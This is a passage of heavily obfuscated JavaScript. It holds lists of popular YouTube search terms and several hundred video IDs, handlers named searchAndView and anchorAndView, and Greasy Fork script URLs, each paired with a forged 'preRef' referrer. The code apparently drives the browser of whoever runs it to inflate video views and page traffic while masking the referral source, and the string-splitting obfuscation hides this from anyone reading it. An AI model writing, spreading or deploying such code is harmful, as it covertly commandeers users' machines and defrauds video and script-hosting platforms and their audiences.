'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + V(0x15) + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1 * 0x1d2c + -0x2300 + -0x201b * -0x2)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x13dc + -0x1358 + -0x2 * 0x3d)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + W(0x14) + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x9fc + -0x2195 + -0x2 * -0xbce);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    V(0x6) + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    X(0x19, ')!C4') + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + W(0xb) + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + X(0xf, 'rSoH') + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x1, 'qdg)') + 'pts/by-sit' + W(0xe) + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + X(0x0, 'Mwil') + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0x3) + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + V(0x5) + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
